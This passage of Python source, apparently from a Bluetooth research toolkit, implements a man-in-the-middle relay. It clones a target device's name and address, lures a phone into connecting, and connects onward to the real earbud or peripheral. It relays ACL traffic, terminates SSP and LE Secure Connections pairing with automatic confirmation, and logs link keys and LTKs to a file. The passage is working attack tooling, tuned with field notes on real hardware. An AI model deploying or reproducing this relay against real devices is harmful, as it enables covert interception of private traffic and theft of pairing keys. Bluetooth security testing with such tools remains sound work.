"""MitmSession — MITM orchestration (replaces the orchestrator.MitmRelay god-class).

Structural notes:
- The session is the **sole owner** of each controller's `set_upstream`: HCI events
  are multi-point subscribed (subscribe/unsubscribe), and ACL data is dispatched by
  handle via if/else to each link's AclRelay.
- BR's SspTermination attaches in the run() startup section (before waiting for the
  phone, a G3 timing hard constraint); LE's ScPairing goes over L2CAP SMP only after
  connection, so it can be built inside the link.
- _run_link is a single skeleton run once each for LE/BR; the two links reconnect
  independently without coupling.
- The AclRelay outbound decoupling engine is reused as-is; the optional transform
  hook is passed through.

HARD RULE: do not import pybluehost.l2cap/.ble/.classic/.gap/.profiles/.stack.
"""
from __future__ import annotations

import asyncio
import dataclasses
import logging
import struct
from collections import deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Callable, Optional

from pybluehost.cli.app.mitm.acl import CID_SMP, encode_l2cap_basic, fragment
from pybluehost.cli.app.mitm.capture import BtsnoopCaptureTap, NullTap
from pybluehost.cli.app.mitm.pairing.delegate import AutoConfirmDelegate, PairingDelegate
from pybluehost.cli.app.mitm.pairing.ltk_store import append_ltk, load_ltks
from pybluehost.cli.app.mitm.pairing.smp import ScPairing
from pybluehost.cli.app.mitm.pairing.ssp import SspTermination
from pybluehost.cli.app.mitm.relay import AclRelay, RelaySide, SmpHandler
from pybluehost.cli.app.mitm.transform import PduTransform
from pybluehost.hci.constants import (
    ErrorCode,
    EventCode,
    HCI_ACCEPT_CONNECTION_REQ,
    HCI_AUTH_REQUESTED,
    HCI_CREATE_CONNECTION,
    HCI_DISCONNECT,
    HCI_LE_CREATE_CONNECTION,
    HCI_LE_CREATE_CONNECTION_CANCEL,
    HCI_LE_LONG_TERM_KEY_REQUEST_REPLY,
    HCI_LE_SET_ADVERTISE_ENABLE,
    HCI_LE_SET_SCAN_ENABLE,
    HCI_LE_SET_SCAN_PARAMS,
    HCI_LE_START_ENCRYPTION,
    HCI_READ_BD_ADDR,
    HCI_REJECT_CONNECTION_REQ,
    HCI_SET_CONNECTION_ENCRYPTION,
    HCI_WRITE_SCAN_ENABLE,
    HCI_WRITE_SIMPLE_PAIRING_MODE,
    LEMetaSubEvent,
    OGF,
    make_opcode,
)
from pybluehost.hci.packets import (
    HCI_LE_Meta_Event,
    HCI_Write_Secure_Connections_Host_Support_Command,
    HCIACLData,
    HCICommand,
    HCIEvent,
)

if TYPE_CHECKING:
    from pybluehost.cli.app.mitm.controllers import ControllerPair
    from pybluehost.cli.app.mitm.recon import ClonedIdentity
    from pybluehost.hci.controller import HCIController

logger = logging.getLogger(__name__)


# A2DP needs EDR multi-slot packets: DM1/3/5 + DH1/3/5 + 2-DH1/3/5 + 3-DH1/3/5.
# Deliberately not the 0x0018 (DM3|DH3 only) precedent from classic/gap.py — that
# would stall the media stream.
_BREDR_PACKET_TYPE_ALL = 0xFC7E

# Core Vol 4 Part E §7.1.7: HCI_Create_Connection_Cancel
HCI_CREATE_CONNECTION_CANCEL = make_opcode(OGF.LINK_CONTROL, 0x08)

# Auth-failure self-heal: forget the local key at most 2 consecutive times per
# address, to prevent a "never-paired" device from hot-looping.
_MAX_FORGETS_PER_ADDR = 2


def build_create_connection_params(addr_le: bytes, *, allow_role_switch: bool = True) -> bytes:
    """HCI_Create_Connection parameter body (Core Vol 4 Part E §7.1.5).

    page_scan_repetition_mode is fixed at R1, clock_offset unknown (0) — recon does
    not currently capture these two values, so the first page is slightly slower but
    reliable; to speed it up later, carry them in ClonedIdentity.
    """
    assert len(addr_le) == 6
    return (
        addr_le
        + _BREDR_PACKET_TYPE_ALL.to_bytes(2, "little")
        + bytes([0x01])  # page_scan_repetition_mode R1
        + bytes([0x00])  # reserved
        + (0x0000).to_bytes(2, "little")  # clock_offset
        + bytes([0x01 if allow_role_switch else 0x00])
    )


def _addr_str_to_le6(addr: str) -> bytes:
    return bytes(reversed(bytes.fromhex(addr.replace(":", ""))))


def _addr7_msb(addr: str, addr_type: int) -> bytes:
    """The 7-byte address for SMP A1/A2: addr_type(1) + address **MSB-first**.

    f5/f6 contract (pairing/crypto.py, f5/f6 consume a1/a2 directly): the spec sample
    A1 = 00561237372600, i.e. [type] + display-order address — **not** the HCI wire
    LSB-first order (orchestrator's bytes(7) placeholder + LE order was a double pit
    of the old code).
    """
    return bytes([addr_type & 0x01]) + bytes.fromhex(addr.replace(":", ""))


def build_le_create_connection_params(peer_addr_le: bytes, peer_addr_type: int) -> bytes:
    """HCI_LE_Create_Connection parameter body (Core Vol 4 Part E §7.8.12).

    The connection parameters align with the stack's BLEConnectionConfig defaults
    (30-50ms / latency 0 / 5s): a real-hardware lesson (NRF_EPD, 2026-09-07) — an
    aggressive 7.5-15ms interval makes the Nordic peripheral ignore CONNECT_IND outright,
    and the controller then reports 0x3E (Connection Failed to be Established), dropping the
    link instantly. 30-50ms matches the AX201 stack's direct connect and is broadly
    compatible.
    """
    assert len(peer_addr_le) == 6
    return (
        struct.pack("<HH", 0x0060, 0x0030)     # scan interval/window
        + bytes([0x00])                        # initiator_filter: peer addr
        + bytes([peer_addr_type & 0x01]) + peer_addr_le
        + bytes([0x00])                        # own_addr_type: public
        + struct.pack("<HHHHHH",
                      0x0018, 0x0028,          # conn interval 30-50ms
                      0x0000,                  # latency
                      0x01F4,                  # supervision timeout 5s
                      0x0000, 0x0000)          # ce len
    )


@dataclass
class _LeConn:
    """Parse result of LE_Connection_Complete / Enhanced."""
    handle: int
    role: int
    peer_addr_type: int
    peer_addr6: bytes


def _le_meta_of(event: HCIEvent) -> Optional[tuple[int, bytes]]:
    """Extract (subevent_code, subevent_params); return None for non-LE-Meta events.

    On the production path 0x3E is decoded by PacketRegistry into HCI_LE_Meta_Event (with
    subevent_code/subevent_parameters); whereas the base-class from_bytes (injected by unit
    tests' FakeCtl) only yields a plain HCIEvent, with the subevent header landing in
    parameters[0]. Same dual-path compatibility as recon.py.
    """
    if event.event_code != EventCode.LE_META:
        return None
    if isinstance(event, HCI_LE_Meta_Event):
        return event.subevent_code, event.subevent_parameters
    p = getattr(event, "parameters", b"") or b""
    if not p:
        return None
    return p[0], p[1:]


@dataclass
class _LinkState:
    """All mutable state of one link (LE or BR) for the current connection. Each reconnect round gets a fresh instance."""
    mode: str
    phone_handle: int
    earbud_handle: int
    relay: AclRelay
    link_lost: asyncio.Event
    # LE only: SMP addresses (addr_type || 6B **MSB-first**, f5/f6 contract — see
    # _addr7_msb) and ScPairing/drain tasks
    phone_addr7: bytes = b""
    phone_peer7: bytes = b""
    target_addr7: bytes = b""
    target_peer7: bytes = b""
    pairings: dict = field(default_factory=dict)
    smp_queues: dict = field(default_factory=dict)
    drain_tasks: list = field(default_factory=list)
    # Event callbacks subscribed this round (all unsubscribed at teardown)
    watches: list = field(default_factory=list)


class MitmSession:
    def __init__(
        self,
        pair: "ControllerPair",
        *,
        identities: dict,
        delegate: Optional[PairingDelegate] = None,
        numeric: bool = False,
        btsnoop: Optional[str] = None,
        clone_address: bool = False,
        key_log: Optional[str | Path] = None,
        name_override: Optional[str] = None,
        connect_timeout: float = 30.0,
        accept_timeout: Optional[float] = None,
        transform: Optional[PduTransform] = None,
        le_target_initiate_pairing: bool = False,
        le_target_connect_delay: float = 0.0,
    ) -> None:
        self._pair = pair
        # {"bredr": ClonedIdentity|None, "le": ClonedIdentity|None}
        self._identities = identities
        self._delegate: PairingDelegate = delegate or AutoConfirmDelegate()
        self._numeric = numeric
        self._capture = BtsnoopCaptureTap(btsnoop) if btsnoop else NullTap()
        self._clone_address = clone_address
        self._key_log = key_log
        # LE LTK persistence: (side, addr) → ltk; shares the same JSONL as SSP link-keys,
        # distinguished by the record's type field (see pairing/ltk_store.py).
        self._ltks = load_ltks(key_log) if key_log else {}
        self._name_override = name_override
        self._connect_timeout = connect_timeout
        self._accept_timeout = accept_timeout
        self._transform = transform
        # Whether LE actively initiates SMP pairing toward the target. Default no: plain
        # unencrypted GATT never needs the relay to pair first, and real hardware
        # (NRF_EPD_7D4D, 2026-09-07) answers an unsolicited Pairing Request with a 0x3E
        # disconnect within ~0.24s. Set True only for SC/LTK testing.
        self._le_target_initiate_pairing = le_target_initiate_pairing
        # Delay in seconds after the phone connects, before connecting to the target.
        # Real-hardware concurrency interference (NRF_EPD): the relay's two legs plus the
        # downstream advertisement are three concurrent BLE links, and connection-event
        # collisions knock the target leg out with 0x3E; pausing the downstream
        # advertisement and waiting a beat gives the target a clean air window. Default 0
        # leaves behavior unchanged.
        self._le_target_connect_delay = le_target_connect_delay

        self._le: Optional[_LinkState] = None
        self._br: Optional[_LinkState] = None
        # Two-connect window buffering: between accept and _build_link completing, ACL
        # fragments the phone sends first are stashed keyed by connection handle — so the
        # BR and LE windows don't cross when concurrent (a single shared queue would
        # overwrite each other's armed handle and feed each other's relay). Bounded; once
        # the link is up they're flushed into the relay in order — dropping the first
        # packets would wedge a peer that doesn't retransmit (a small buffer reserved in
        # the design; the 2026-09-06 hardware regression confirmed it's needed). The window
        # only carries signaling/retransmits (media needs signaling through the relay
        # first), so 64 is plenty; on overflow the oldest is silently evicted — the peer
        # retransmits anyway.
        self._pending_down_acl: dict[int, deque] = {}  # phone handle → window-period buffered fragments
        # Auth-failure self-heal: target address → consecutive times the local key has been
        # forgotten (reset on pairing success, capped at _MAX_FORGETS_PER_ADDR so an
        # unpaired device can't spin the relay hot).
        self._forget_counts: dict[str, int] = {}
        # Whether the SC capability mirror has been applied (once per session, see
        # _mirror_sc_support_once).
        self._sc_mirrored = False
        # Both local dongle addresses (6B LE order; filled via Read_BD_ADDR in run()'s LE
        # startup section, all-zero in unit tests / before run(), still safe for
        # _build_link's LE branch)
        self._down_addr6 = bytes(6)
        self._up_addr6 = bytes(6)
        self._subs: dict[str, list] = {"down": [], "up": []}
        self._ssp: dict[str, SspTermination] = {}
        self._bredr_conns: dict[str, int] = {}   # upstream connection table (addr_le_hex→handle)
        self._installed = False
        # Set while any link is alive (lets the stats reporter tell the relay is connected)
        self.connected = asyncio.Event()

    # ------------------------------------------------------- event dispatch (sole owner)
    def _install_dispatch(self) -> None:
        if self._installed:
            return
        for side, ctl in (("down", self._pair.downstream), ("up", self._pair.upstream)):
            # Passing prev_sco through unchanged is **intentional**: SCO voice doesn't go
            # through the session (the link relay only handles ACL), the session doesn't
            # own the SCO callback, and it must not be touched here — let alone
            # "conveniently" set to None.
            prev_sco = ctl._on_sco_data  # type: ignore[attr-defined]
            ctl.set_upstream(
                on_hci_event=self._make_event_dispatch(side),
                on_acl_data=self._on_down_acl if side == "down" else self._on_up_acl,
                on_sco_data=prev_sco,
            )
        self._installed = True

    def _make_event_dispatch(self, side: str) -> Callable[[HCIEvent], None]:
        def dispatch(event: HCIEvent) -> None:
            for cb in list(self._subs[side]):
                cb(event)
        return dispatch

    def _subscribe(self, side: str, cb: Callable[[HCIEvent], None]) -> None:
        self._subs[side].append(cb)

    def _unsubscribe(self, side: str, cb: Callable[[HCIEvent], None]) -> None:
        try:
            self._subs[side].remove(cb)
        except ValueError:
            pass

    # ACL dispatch is async: HCIController inline-awaits the coroutine return value of
    # on_acl_data (same semantics as the orchestrator wiring relay.on_phone_acl directly),
    # so the coroutine is not dropped.
    async def _on_down_acl(self, acl: HCIACLData) -> None:
        if self._le is not None and acl.handle == self._le.phone_handle:
            await self._le.relay.on_phone_acl(acl)
        elif self._br is not None and acl.handle == self._br.phone_handle:
            await self._br.relay.on_phone_acl(acl)
        elif acl.handle in self._pending_down_acl:
            # Two-connect window: frames the phone sends after accept but before the link
            # is built are stashed by handle (bounded) and flushed once built — dropping
            # them outright would wedge a peer that doesn't retransmit (e.g. the CSR test
            # source). Keyed by handle rather than a "both links are None" pre-check: when
            # the other link (e.g. LE) is alive / also in its window, this BR window's
            # frames must still be stashed — not dropped, and never fed into the other's
            # relay.
            self._pending_down_acl[acl.handle].append(acl)
        # Other handles (unregistered/already cleaned up): ignore

    async def _on_up_acl(self, acl: HCIACLData) -> None:
        if self._le is not None and acl.handle == self._le.earbud_handle:
            await self._le.relay.on_target_acl(acl)
        elif self._br is not None and acl.handle == self._br.earbud_handle:
            await self._br.relay.on_target_acl(acl)

    # ------------------------------------------------------------- lifecycle
    async def run(self) -> None:
        """impersonate → SSP/dispatch install → both links run resident concurrently (never returns normally; reconnects internally on link loss)."""
        await self._impersonate_all()
        modes = [m for m in ("bredr", "le") if self._identities.get(m) is not None]
        if not modes:
            raise RuntimeError("没有任何可用身份:先跑 `pybluehost app mitm scan`,或用 --target 指定")

        self._install_dispatch()
        # Downstream (phone-side) own address: shown in the waiting log so the operator
        # knows which device the phone should connect to (needed in both modes).
        evt_down = await self._pair.downstream.send_command(
            HCICommand(opcode=HCI_READ_BD_ADDR))
        self._down_addr6 = evt_down.parameters[-6:]
        if "bredr" in modes:
            # Connecting to the earbud also needs SSP with upstream as initiator; the SSP
            # terminator must be attached before any connection (G3 timing: the phone
            # initiates pairing as soon as the ACL comes up).
            await self._pair.upstream.send_command(
                HCICommand(opcode=HCI_WRITE_SIMPLE_PAIRING_MODE, parameters=bytes([0x01]))
            )
            self._ensure_ssp()
            self._subscribe("up", self._tracker_on_event)

        if "le" in modes:
            # SMP f5/f6 needs the local real address (the orchestrator's bytes(7)
            # placeholder is a known bug; read upstream's real BD_ADDR here — downstream
            # was already read above); the phone's LE_LTK_Request is driven via the
            # controller event callback and must be registered before any LE connection.
            evt_up = await self._pair.upstream.send_command(
                HCICommand(opcode=HCI_READ_BD_ADDR))
            self._up_addr6 = evt_up.parameters[-6:]
            self._pair.downstream.on_le_ltk_request(self._on_phone_ltk_request)

        tasks = [asyncio.ensure_future(self._run_link(m)) for m in modes]
        try:
            await asyncio.gather(*tasks)
        finally:
            for t in tasks:
                t.cancel()
            # Convergence: wait for the subtasks to actually exit before returning.
            # Otherwise when run() returns the sibling links' cleanup is still in flight,
            # and a caller invoking teardown() next would race the subtask cleanup; a
            # second cancel could also land mid-way through some subtask's finally.
            await asyncio.gather(*tasks, return_exceptions=True)

    def _phone_visible_desc(self, mode: str) -> str:
        """The impersonated "name+MAC" the phone sees in its Bluetooth list (for the waiting
        log, to tell the operator which device to connect to).

        LE by default advertises the downstream dongle's own public address; with
        clone_address the random address = the target's LE address, and the displayed MAC
        is the actual over-the-air advertising address.
        """
        ident = getattr(self, "_identities", {}).get(mode)
        name = getattr(self, "_name_override", None) or (ident.name if ident else None)
        name_s = name if name else "(无名字:手机列表将无名称可辨!)"
        addr6 = getattr(self, "_down_addr6", bytes(6))
        if mode == "le" and getattr(self, "_clone_address", False) and ident:
            return f"「{name_s}」MAC={ident.address} (random)"
        mac = ":".join(f"{b:02X}" for b in reversed(addr6))
        if not any(addr6):
            return f"「{name_s}」MAC=(未知)"
        if mode == "le":
            return f"「{name_s}」MAC={mac} (public)"
        return f"「{name_s}」MAC={mac}"

    async def _impersonate_all(self) -> None:
        for mode in ("bredr", "le"):
            ident = self._identities.get(mode)
            if ident is None:
                continue
            if self._name_override is not None:
                ident = dataclasses.replace(ident, name=self._name_override)
            if mode == "bredr":
                from pybluehost.cli.app.mitm.bredr_impersonate import (  # noqa: PLC0415
                    start_bredr_impersonation,
                )
                await start_bredr_impersonation(
                    self._pair.downstream, ident, clone_address=self._clone_address
                )
            else:
                from pybluehost.cli.app.mitm.impersonate import (  # noqa: PLC0415
                    start_impersonation,
                )
                await start_impersonation(
                    self._pair.downstream, ident, clone_address=self._clone_address
                )

    def _ensure_ssp(self) -> None:
        """Create and attach both SspTermination instances (idempotent). Hard timing constraint: see run()."""
        if self._ssp:
            return
        self._ssp = {
            "phone": SspTermination(
                self._pair.downstream, delegate=self._delegate, side_name="phone",
                numeric=self._numeric, key_log_path=self._key_log,
            ),
            "target": SspTermination(
                self._pair.upstream, delegate=self._delegate, side_name="target",
                numeric=self._numeric, key_log_path=self._key_log,
            ),
        }
        self._ssp["phone"].attach()
        self._ssp["target"].attach()

    # --------------------------------------------------------------- link skeleton
    def _make_link_state(
        self, mode: str, *, phone_handle: int, earbud_handle: int, relay: AclRelay
    ) -> _LinkState:
        return _LinkState(
            mode=mode, phone_handle=phone_handle, earbud_handle=earbud_handle,
            relay=relay, link_lost=asyncio.Event(),
        )

    def _link_attr(self, mode: str) -> str:
        return "_br" if mode == "bredr" else "_le"

    # ------------------------------------------------------- two-connect window pre-buffering
    def _arm_pending(self, phone_handle: int) -> None:
        """Arm after accept returns, before connect: this handle's downlink ACL goes into a
        dedicated stash queue (re-arming the same handle = a fresh queue; stale frames are
        discarded)."""
        self._pending_down_acl[phone_handle] = deque(maxlen=64)

    def _disarm_pending(self, phone_handle: int) -> None:
        """Abandon this round of the phone connection (target connect failed / link
        teardown): remove only this handle's stash, never touch another link's open
        window."""
        self._pending_down_acl.pop(phone_handle, None)

    async def _flush_pending(self, link: _LinkState) -> None:
        """After the link is built, flush this handle's stashed frames into the relay in
        FIFO order. **Pop first, then flush**: frames arriving during the flush go straight
        to the link via _on_down_acl's normal path — no reordering, no duplication."""
        q = self._pending_down_acl.pop(link.phone_handle, None)
        while q:
            await link.relay.on_phone_acl(q.popleft())

    async def _set_le_advertising(self, enabled: bool) -> None:
        """Toggle the downstream (phone-side) LE impersonation advertisement.

        Real-hardware lesson (NRF_EPD_7D4D, 2026-09-07): while connecting to the target,
        the downstream is still saturating the 37/38/39 advertising channels, and the
        cloned advertisement drowns out the real peripheral's advertisement in the same
        environment — the central side's ConnComplete times out or connects then drops with
        0x3E. So pause advertising before connecting to the target and restore it after
        teardown (the advertising parameters persist, so re-enabling is cheap). Failure
        only warns: a single failed HCI command must not interrupt the accept→connect main
        flow.
        """
        try:
            await self._pair.downstream.send_command(
                HCICommand(opcode=HCI_LE_SET_ADVERTISE_ENABLE,
                           parameters=bytes([0x01 if enabled else 0x00])))
        except Exception as exc:
            logger.warning("session[le]: %s伪装广播失败(忽略): %s",
                           "恢复" if enabled else "暂停", exc)

    async def _run_link(self, mode: str) -> None:
        """One skeleton, two modes: wait for phone → connect earbud → build relay → run resident → teardown on link loss → repeat."""
        accept = self._accept_bredr if mode == "bredr" else self._accept_le
        connect = self._connect_bredr if mode == "bredr" else self._connect_le
        bring_up = self._bredr_bring_up if mode == "bredr" else self._le_bring_up
        attr = self._link_attr(mode)

        while True:
            if mode == "bredr":
                # Re-open scan: Intel pauses inquiry scan during ACL and doesn't resume it
                # after teardown; without re-sending, phones can't find the impersonated
                # device after the first round (LE has no such issue).
                await self._ensure_phone_visible()
            accepted = await accept()
            # BR accept returns an int; LE returns a _LeConn (carries the phone's real
            # address for SMP A1/A2)
            le_conn = None if isinstance(accepted, int) else accepted
            phone_handle = accepted if isinstance(accepted, int) else accepted.handle
            # Two-connect window begins: while we connect to the target the phone may
            # already have sent L2CAP/SDP, so arm the stash first (keyed by this link's
            # handle; sibling links' windows/live links are unaffected)
            self._arm_pending(phone_handle)
            logger.info("session[%s]: 手机已连接 handle=0x%03X,随即连目标...", mode, phone_handle)
            try:
                if mode == "le":
                    # Pause downstream advertising before connecting to the target, so the
                    # cloned advertisement doesn't drown out the real peripheral's (0x3E)
                    await self._set_le_advertising(False)
                    if self._le_target_connect_delay > 0:
                        # Concurrency interference (NRF_EPD): after stopping advertising,
                        # give the target a clean air window so the NRF connection anchors
                        # in an RF environment free of cloned advertisements before data is
                        # forwarded
                        await asyncio.sleep(self._le_target_connect_delay)
                earbud_handle = await connect()
            except Exception as exc:
                logger.warning("session[%s]: 连目标失败(%s),断手机侧回等", mode, exc)
                if mode == "le":
                    await self._set_le_advertising(True)
                self._disarm_pending(phone_handle)
                await self._graceful_disconnect(self._pair.downstream, phone_handle)
                continue

            try:
                relay, link = self._build_link(mode, phone_handle, earbud_handle,
                                               le_conn=le_conn)
            except BaseException:
                # _build_link raising (relay/watch construction failed) kills this link's
                # task and abandons the phone connection along with it — must disarm the
                # stash, otherwise the dispatcher buffers for a handle that will never
                # become a link
                self._disarm_pending(phone_handle)
                raise
            setattr(self, attr, link)
            try:
                # Flush the backlog before announcing connected/bring_up; frames arriving
                # during the flush take the normal path
                await self._flush_pending(link)
                self.connected.set()
                secured = await bring_up(link)
                if mode == "bredr" and secured is False and self._bredr_forget_stale_key():
                    # Auth failed and there's a stale local key: drop it and redo the whole
                    # round — set link_lost so the finally cleanup runs (disconnect both
                    # handles) and the while loop naturally returns to accept.
                    link.link_lost.set()
                await link.link_lost.wait()
            finally:
                setattr(self, attr, None)
                self._disarm_pending(phone_handle)
                if self._br is None and self._le is None:
                    self.connected.clear()
                try:
                    await relay.stop()
                except Exception:
                    # A stop failure (e.g. egress queue stuck) must never block the
                    # unsubscribe and disconnect cleanup below
                    logger.exception("session: relay stop 失败")
                # LE's SMP drain tasks share the link's lifecycle and are cancelled with the relay
                for t in link.drain_tasks:
                    t.cancel()
                if link.drain_tasks:
                    await asyncio.gather(*link.drain_tasks, return_exceptions=True)
                await asyncio.gather(
                    self._graceful_disconnect(self._pair.downstream, phone_handle),
                    self._graceful_disconnect(self._pair.upstream, earbud_handle),
                    return_exceptions=True,
                )
                for side, cb in link.watches:
                    self._unsubscribe(side, cb)
                if mode == "le":
                    # Restore downstream impersonation advertising so the next phone can
                    # discover/connect again
                    await self._set_le_advertising(True)
            logger.info("session[%s]: 链路断开并清理,回等手机重连...", mode)

    def _build_link(
        self, mode: str, phone_handle: int, earbud_handle: int,
        le_conn: Optional["_LeConn"] = None,
    ) -> tuple[AclRelay, _LinkState]:
        """Get buffer → build RelaySide×2 → (LE: real-address pairings + SMP bridge) →
        AclRelay → link-loss watch subscription. LE's smp_handler must be ready **before**
        the relay is constructed (injected via the constructor, not by poking relay private
        attrs afterwards); if extras fails, no subscribed-but-never-unsubscribed watch may
        be left behind."""
        downstream = self._pair.downstream
        upstream = self._pair.upstream
        if mode == "bredr":
            phone_max = downstream.acl_packet_length or 27
            target_max = upstream.acl_packet_length or 27
        else:
            phone_max = downstream.le_acl_packet_length or downstream.acl_packet_length or 27
            target_max = upstream.le_acl_packet_length or upstream.acl_packet_length or 27
        phone_side = RelaySide(name="phone", handle=phone_handle,
                               acl_max_payload=phone_max, send_acl=downstream.send_acl_data)
        target_side = RelaySide(name="target", handle=earbud_handle,
                                acl_max_payload=target_max, send_acl=upstream.send_acl_data)
        # link is built before relay: the LE branch fills addresses/pairings/SMP queues into link
        link = self._make_link_state(mode, phone_handle=phone_handle,
                                     earbud_handle=earbud_handle, relay=None)
        smp_handler = None
        if mode == "le":
            ident = self._identities.get("le")
            assert ident is not None and le_conn is not None
            # Addresses: local = each side's real dongle BD_ADDR; peer = phone from the
            # connection-complete event, target from the cloned identity.
            # addr7 = addr_type(1) || 6B **MSB-first** (f5/f6 contract; the 6B in HCI
            # events/commands is wire LSB-first and must be reversed).
            link.phone_addr7 = bytes([0x00]) + bytes(reversed(self._down_addr6))
            link.phone_peer7 = (bytes([le_conn.peer_addr_type & 0x01])
                                + bytes(reversed(le_conn.peer_addr6)))
            link.target_addr7 = bytes([0x00]) + bytes(reversed(self._up_addr6))
            link.target_peer7 = _addr7_msb(ident.address, ident.address_type)
            self._le_relay_extras(link)
            smp_handler = self._make_smp_handler(link)  # ← drain tasks are in flight from here
        try:
            relay = AclRelay(phone_side=phone_side, target_side=target_side,
                             capture=self._capture, smp_handler=smp_handler,
                             transform=self._transform)
            link.relay = relay
            # Link-loss watch: this side's handle dropping → disconnect the peer → set
            # link_lost (clears only this link, doesn't cascade to the other). The watch
            # captures this round's link object: a stale watch structurally can't kill a new
            # link that reuses the same handle.
            down_watch = self._make_watch(mode, link, phone_handle, upstream, earbud_handle,
                                          side="phone")
            up_watch = self._make_watch(mode, link, earbud_handle, downstream, phone_handle,
                                        side="earbud")
            self._subscribe("down", down_watch)
            self._subscribe("up", up_watch)
            link.watches = [("down", down_watch), ("up", up_watch)]
        except BaseException:
            # Closing the leak window: drain tasks are already in flight but _run_link's
            # finally hasn't taken over yet — if relay construction / watch / subscribe
            # raises, they must be cancelled and reaped on the spot, otherwise both drain
            # tasks park on queue.get() forever. BaseException: also closes over the
            # CancelledError path; re-raise semantics unchanged.
            for t in link.drain_tasks:
                t.cancel()
            if link.drain_tasks:
                asyncio.ensure_future(
                    asyncio.gather(*link.drain_tasks, return_exceptions=True))
            raise
        return relay, link

    def _build_link_for_test(self) -> tuple[AclRelay, _LinkState]:
        """Unit-test helper: fixed handles 0x10 (phone)/0x11 (earbud), via the real
        _build_link LE branch.

        The phone peer address uses a fixed illustrative value (distinct from the target
        cloned identity); production paths don't go through this method.
        """
        conn = _LeConn(handle=0x11, role=0x00, peer_addr_type=0,
                       peer_addr6=bytes.fromhex("665544332211"))
        return self._build_link("le", 0x10, 0x11, le_conn=conn)

    def _make_watch(
        self, mode: str, link: _LinkState, my_handle: int,
        peer_ctl: "HCIController", peer_handle: int,
        side: str = "?",
    ) -> Callable[[HCIEvent], None]:
        async def _peer_down() -> None:
            if link.link_lost.is_set():
                return
            try:
                await peer_ctl.send_command(
                    HCICommand(opcode=HCI_DISCONNECT,
                               # 0x16 is the event-side "local terminated" code; BE200
                               # strictly validates the command reason and rejects it (0x12).
                               # The command side must use a legal value such as 0x13.
                               parameters=peer_handle.to_bytes(2, "little") + bytes([0x13]))
                )
            except Exception:
                logger.exception("session: 对侧 disconnect 失败")
            if link.link_lost.is_set():
                return  # the other side already fired; avoid double-handling
            link.link_lost.set()

        def on_event(event: HCIEvent) -> None:
            if event.event_code == EventCode.DISCONNECTION_COMPLETE:
                p = event.parameters
                if len(p) >= 4 and int.from_bytes(p[1:3], "little") == my_handle:
                    reason = p[3]
                    try:
                        rname = ErrorCode(reason).name
                    except ValueError:
                        rname = "?"
                    logger.warning("session[%s]: 链路断开 side=%s handle=0x%03X reason=0x%02X(%s)",
                                   mode, side, my_handle, reason, rname)
                    asyncio.ensure_future(_peer_down())

        return on_event

    # ---------------------------------------------------- upstream connection-table tracker
    def _tracker_on_event(self, event: HCIEvent) -> None:
        p = getattr(event, "parameters", b"") or b""
        if event.event_code == EventCode.CONNECTION_COMPLETE:
            # status(1) handle(2, LE) bd_addr(6)
            if len(p) >= 9 and p[0] == 0x00:
                self._bredr_conns[bytes(p[3:9]).hex()] = int.from_bytes(p[1:3], "little")
        elif event.event_code == EventCode.DISCONNECTION_COMPLETE:
            if len(p) >= 4:
                gone = int.from_bytes(p[1:3], "little")
                for addr in [a for a, h in self._bredr_conns.items() if h == gone]:
                    del self._bredr_conns[addr]

    # ------------------------------------------------- mode implementation BR (Task 7)
    async def _accept_bredr(self) -> int:
        return await self._accept_bredr_on(self._pair.downstream)

    async def _accept_bredr_on(
        self, controller: "HCIController", *, auto_accept: bool = True
    ) -> int:
        """Wait for a classic Connection_Complete event (0x03); return the connection handle.

        Connection_Complete layout: status(1) handle(2, LE) bd_addr(6) link_type(1)
        encryption_mode(1). Automatically replies HCI_Accept_Connection_Request to incoming
        Connection_Request events (ACL link_type=0x01 only) so the phone side's page doesn't
        time out.

        Passively waits for the phone to tap; the duration is unpredictable, so it uses
        self._accept_timeout (default None = wait indefinitely), not the self._connect_timeout
        used by active connects.
        """
        loop = asyncio.get_running_loop()
        fut: asyncio.Future[int] = loop.create_future()
        # Earbud-reconnect guard: a page matching the impersonated identity must be the
        # earbud treating us as an already-paired phone, and must be rejected (we can't
        # accept it as the "phone" — A2DP would be held by the earbud's own request, and it
        # could loop back into forwarding). Not enabled when identity is None (unit tests).
        ident = self._identities.get("bredr")
        identity_le = (
            bytes(reversed(bytes.fromhex(ident.address.replace(":", ""))))
            if ident is not None
            else None
        )

        def _log_accept_error(accept_task: "asyncio.Task") -> None:
            exc = accept_task.exception()
            if exc is not None:
                logger.warning("Accept/Reject_Connection_Request 发送失败: %s", exc)

        def on_event(event: HCIEvent) -> None:
            if event.event_code == EventCode.CONNECTION_REQUEST:
                # bd_addr(6) + class_of_device(3) + link_type(1); only accept ACL (0x01).
                params = getattr(event, "parameters", b"") or b""
                if len(params) >= 10 and params[0:6] == identity_le:
                    # The earbud is paging the downstream impersonated device (treating us as
                    # an already-paired phone): reject (0x0D limited resources), don't accept
                    # it as the "phone", and don't resolve the connection future.
                    asyncio.ensure_future(
                        controller.send_command(
                            HCICommand(
                                opcode=HCI_REJECT_CONNECTION_REQ,
                                parameters=params[0:6] + bytes([0x0D]),
                            )
                        )
                    ).add_done_callback(_log_accept_error)
                elif len(params) >= 10 and params[9] == 0x01 and auto_accept:
                    accept_task = asyncio.ensure_future(
                        controller.send_command(
                            HCICommand(
                                opcode=HCI_ACCEPT_CONNECTION_REQ,
                                parameters=params[0:6] + bytes([0x01]),  # role=stay slave
                            )
                        )
                    )
                    accept_task.add_done_callback(_log_accept_error)
            if event.event_code == EventCode.CONNECTION_COMPLETE:
                params = getattr(event, "parameters", b"") or b""
                # status(1) handle(2, LE) ...; an earbud reconnect completing (address =
                # impersonated identity) doesn't count as the phone, so even with status=0
                # the future is not resolved.
                is_earbud_complete = (
                    identity_le is not None
                    and len(params) >= 9
                    and params[3:9] == identity_le
                )
                if (
                    not is_earbud_complete
                    and len(params) >= 3
                    and params[0] == 0x00
                    and not fut.done()
                ):
                    handle = int.from_bytes(params[1:3], "little")
                    fut.set_result(handle)

        self._subscribe("down", on_event)
        logger.info(
            "session[bredr]: 等待手机连接伪装设备 %s(手机蓝牙列表按此名字/地址"
            "连接,accept_timeout=%s)...",
            self._phone_visible_desc("bredr"),
            "常驻" if self._accept_timeout is None else f"{self._accept_timeout}s",
        )
        try:
            # wait_for(timeout=None) is equivalent to awaiting fut indefinitely;
            # Ctrl-C/upstream failure propagates via gather cancellation, and the finally
            # still unsubscribes.
            return await asyncio.wait_for(fut, timeout=self._accept_timeout)
        finally:
            self._unsubscribe("down", on_event)

    async def _connect_bredr(self) -> int:
        ident = self._identities.get("bredr")
        assert ident is not None
